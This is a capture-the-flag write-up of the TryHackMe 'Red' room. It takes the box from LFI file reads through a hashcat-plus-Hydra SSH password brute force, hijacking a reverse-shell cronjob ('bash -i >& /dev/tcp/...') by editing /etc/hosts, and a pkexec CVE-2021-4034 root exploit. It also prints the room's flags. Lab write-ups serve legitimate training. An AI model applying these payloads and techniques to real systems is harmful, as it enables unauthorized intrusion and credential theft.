## Red - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/redisl33t)

The match has started, and Red has taken the lead on you.
But you are Blue, and only you can take Red down.

However, Red has implemented some defense mechanisms that will make the battle a bit difficult:
1. Red has been known to kick adversaries out of the machine. Is there a way around it?
2. Red likes to change adversaries' passwords but tends to keep them relatively the same. 
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!

This is a unique battle, and if you feel up to the challenge. Then by all means go for it!
Whenever you are ready, click on the Start Machine button to fire up the Virtual Machine.

**IP: 10.10.34.14**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster, Hashcat, Hydra<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Gobuster.

  ```
  $ nmap -sC -sV -p- 10.10.34.14

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
  |   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
  |_  256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  | http-title: Atlanta - Free business bootstrap template
  |_Requested resource was /index.php?page=home.html
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  $ gobuster dir -u http://10.10.34.14/ -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 276]
  /.htaccess            (Status: 403) [Size: 276]
  /.htpasswd            (Status: 403) [Size: 276]
  /assets               (Status: 301) [Size: 311] [--> http://10.10.34.14/assets/]
  /index.php            (Status: 302) [Size: 0] [--> /index.php?page=home.html]
  /server-status        (Status: 403) [Size: 276]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```

---

## 🌐 Web Exploitation 

- Ofc there is LFI on the main page.

  ```
  http://10.10.34.14/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  [SNIP!]
  blue:x:1000:1000:blue:/home/blue:/bin/bash
  lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
  red:x:1001:1001::/home/red:/bin/bash
  ```
  
- Now we have users `red` and `blue` beside `root`, so I started looking for some sensitive stuff with LFI and I read `.bash_history`.

  ```
  http://10.10.34.14/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.bash_history

  ZWNobyAiUmVkIHJ1bGVzIgpjZApoYXNoY2F0IC0tc3Rkb3V0IC5yZW1pbmRlciAtciAvdXNyL3NoYXJlL2hhc2hjYXQvcnVsZXMvYmVzdDY0LnJ1bGUgPiBwYXNzbGlzdC50eHQKY2F0IHBhc3NsaXN0LnR4dApybSBwYXNzbGlzdC50eHQKc3VkbyBhcHQtZ2V0IHJlbW92ZSBoYXNoY2F0IC15Cg==
  
  $ echo 'ZWNobyAiUmVkIHJ1bGVzIgpjZApoYXNoY2F0IC0tc3Rkb3V0IC5yZW1pbmRlciAtciAvdXNyL3NoYXJlL2hhc2hjYXQvcnVsZXMvYmVzdDY0LnJ1bGUgPiBwYXNzbGlzdC50eHQKY2F0IHBhc3NsaXN0LnR4dApybSBwYXNzbGlzdC50eHQKc3VkbyBhcHQtZ2V0IHJlbW92ZSBoYXNoY2F0IC15Cg==' | base64 -d
  echo "Red rules"
  cd
  hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
  cat passlist.txt
  rm passlist.txt
  sudo apt-get remove hashcat -y
  ```
  
- Then I checked that `.reminder` file and found a password.

  ```
  http://10.10.34.14/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.reminder

  c3VwM3JfcEBzJHcwcmQhCg==
  
  $ echo 'c3VwM3JfcEBzJHcwcmQhCg==' | base64 -d
  sup3r_p@s$w0rd!
  ```

- So here, I started brute forcing like a maniac with multiple wordlists and still got nothing. Then I used the same commands that `blue` did and finally found credentials for SSH.

  ```
  $ echo 'sup3r_p@s$w0rd!' > password.txt
  
  $ hashcat --stdout password.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt
  
  $ wc -l passlist.txt                          
  77 passlist.txt
  
  $ hydra -l blue -P passlist.txt 10.10.34.14 ssh
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-07 12:15:48
  [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
  [DATA] attacking ssh://10.10.34.14:22/
  [22][ssh] host: 10.10.34.14   login: blue   password: sup3r_p@s$w0rd!9
  1 of 1 target successfully completed, 1 valid password found
  [WARNING] Writing restore file because 3 final worker threads did not complete until end.
  [ERROR] 3 targets did not resolve or could not be connected
  [ERROR] 0 target did not complete
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-07 12:15:52
  ```

- Now login with SSH and let's look for some flags.

---

## 🧍 User Privilege Escalation

- First flag is already there.

  ```
  ssh blue@10.10.34.14
  blue@10.10.34.14's password: 
  Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)
  [SNIP!]
  blue@red:~$ whoami
  blue
  blue@red:~$ id
  uid=1000(blue) gid=1000(blue) groups=1000(blue)
  
  blue@red:~$ cat flag1
  THM{Is_thAt_all_y0u_can_d0_blU3?}
  ```
  
- Now, I started enumeration for escalation and well.............

  ```
  blue@red:~$ Fine fine, just run sudo -l and then enter this password WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==
  Say Bye Bye to your Shell Blue and that password
  Connection to 10.10.34.14 closed by remote host.
  Connection to 10.10.34.14 closed.
  
  echo 'WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==' | base64 -d
  You really suck at this Blue
  ```
  
- YA BOI KICKED ME OUT HAHAHAHAHAHAHAHAHAHAHA.

- OK, you probably saw multiple messages popping off in SSH and there is a way to bypass this malicious cronjob that kicks `blue` everytime we login. Use `-T` while logging in with SSH which doesn't create `pts` file. Also, you must brute force a new password again...

  ```
  [22][ssh] host: 10.10.34.14   login: blue   password: sup3r_p@s$w0rd!123
  ssh blue@10.10.34.14 -T
  sup3r_p@s$w0rd!123
  ```

- Since there is a malicious cronjob that kicked me out, there must be something else in the background running right?

  ```
  ps aux
  red        14811  0.0  0.0   6972  2668 ?        S    11:24   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
  red        14832  0.0  0.0   6972  2520 ?        S    11:25   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
  ```

- This is a classic reverse shell so let's abuse it. Check permissions for `/etc/hosts` and edit them if we have write permission. (ofc we do lol). Then start a listener on port 9001 and wait for connection.

  ```
  ls -al /etc/hosts
  -rw-r--rw- 1 root adm 242 Jun  7 11:24 /etc/hosts
  
  cat /etc/hosts
  127.0.0.1 localhost
  127.0.1.1 red
  192.168.0.1 redrules.thm
  
  # The following lines are desirable for IPv6 capable hosts
  ::1     ip6-localhost ip6-loopback
  fe00::0 ip6-localnet
  ff00::0 ip6-mcastprefix
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouter
  
  lsattr /etc/hosts
  -----a--------e----- /etc/hosts
  
  echo "[YOUR-THM-IP]  redrules.thm" >> /etc/hosts
  
  nc -lvnp 9001
  listening on [any] 9001 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.34.14] 42234
  bash: cannot set terminal process group (14914): Inappropriate ioctl for device
  bash: no job control in this shell
  red@red:~$ whoami
  whoami
  red
  red@red:~$ id
  id
  uid=1001(red) gid=1001(red) groups=1001(red)
  ```

- Now we are `red`. WHO SUCKS NOW RED HUH????? Read the second flag and move to root escalation.

  ```
  red@red:~$ ls -al
  ls -al
  total 36
  drwxr-xr-x 4 root red  4096 Aug 17  2022 .
  drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
  lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -> /dev/null
  -rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
  -rw-r--r-- 1 red  red  3771 Feb 25  2020 .bashrc
  drwx------ 2 red  red  4096 Aug 14  2022 .cache
  -rw-r----- 1 root red    41 Aug 14  2022 flag2
  drwxr-x--- 2 red  red  4096 Aug 14  2022 .git
  -rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
  -rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
  -rw------- 1 red  red     0 Aug 17  2022 .viminfo
  red@red:~$ cat flag2
  cat flag2
  THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
  ```

- Ooooh Red ma boi, I'm pwning your machine for sure.

---

## 👑 Root Privilege Escalation

- You can see that `.git` directory, let's check it out.

  ```
  red@red:~$ cd .git
  red@red:~/.git$ ls -al
  total 40
  drwxr-x--- 2 red  red   4096 Aug 14  2022 .
  drwxr-xr-x 4 root red   4096 Aug 17  2022 ..
  -rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec
  
  red@red:~/.git$ ./pkexec --version
  pkexec version 0.105
  
  red@red:~/.git$ ls -al /usr/bin/pkexec
  -rwxr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec
  
  red@red:~/.git$ ls -al pkexec 
  -rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec
  ```
  
- Pkexec exploitation time legooooooooooooooo. Here's a pretty cool [exploit](https://github.com/joeammond/CVE-2021-4034) that will do all the job for us.

- Create a new file and copy/paste the code in that file. Also, important, change the last line of code into the target machines `pkexec` path. `/home/red/.git/pkexec`

  ```
  red@red:~/.git$ ls -al
  total 44
  drwxr-x--- 2 red  red   4096 Jun  7 11:40 .
  drwxr-xr-x 4 root red   4096 Aug 17  2022 ..
  -rw-rw-r-- 1 red  red   3268 Jun  7 11:40 exploit.py
  -rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec
  red@red:~/.git$ cat exploit.py
  #!/usr/bin/env python3
  
  # CVE-2021-4034 in Python
  #
  # Joe Ammond (joe@ammond.org)
  #
  # This was just an experiment to see whether I could get this to work
  # in Python, and to play around with ctypes
  
  # This was completely cribbed from blasty's original C code:
  # https://haxx.in/files/blasty-vs-pkexec.c
  
  import base64
  import os
  import sys
  
  from ctypes import *
  from ctypes.util import find_library
  
  [SNIP!]
  
  print('[+] Calling execve()')
  # Call execve() with NULL arguments
  libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p) <- EDIT HERE!
  ```

- Now just run the exploit, get root, and red the flag.

  ```
  red@red:~/.git$ python3 exploit.py 
  [+] Creating shared library for exploit code.
  [+] Calling execve()
  # whoami
  root
  # id
  uid=0(root) gid=1001(red) groups=1001(red)
  # pwd
  /home/red/.git
  # cd /root
  # ls -al
  total 40
  drwx------  6 root root 4096 Apr 24  2023 .
  drwxr-xr-x 19 root root 4096 Aug 13  2022 ..
  lrwxrwxrwx  1 root root    9 Aug 14  2022 .bash_history -> /dev/null
  -rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
  drwx------  2 root root 4096 Aug 13  2022 .cache
  -rw-r--r--  1 root root  161 Dec  5  2019 .profile
  -rw-r--r--  1 root root   75 Aug 14  2022 .selected_editor
  drwx------  2 root root 4096 Aug 13  2022 .ssh
  -rw-------  1 root root    0 Apr 24  2023 .viminfo
  drwxr-xr-x  2 root root 4096 Apr 24  2023 defense
  -rw-r-----  1 root root   23 Aug 14  2022 flag3
  drwx------  3 root root 4096 Aug 13  2022 snap
  # cat flag3
  THM{Go0d_Gam3_Blu3_GG}
  ```

- Bye Bye Red You Suck!
  
---

## 🏁 Flags

- **First Flag**: `THM{Is_thAt_all_y0u_can_d0_blU3?}`
- **Second Flag**: `THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}`
- **Third Flag**: `THM{Go0d_Gam3_Blu3_GG}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Messages in SSH...`

- What did I learn?
  `New exploit.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
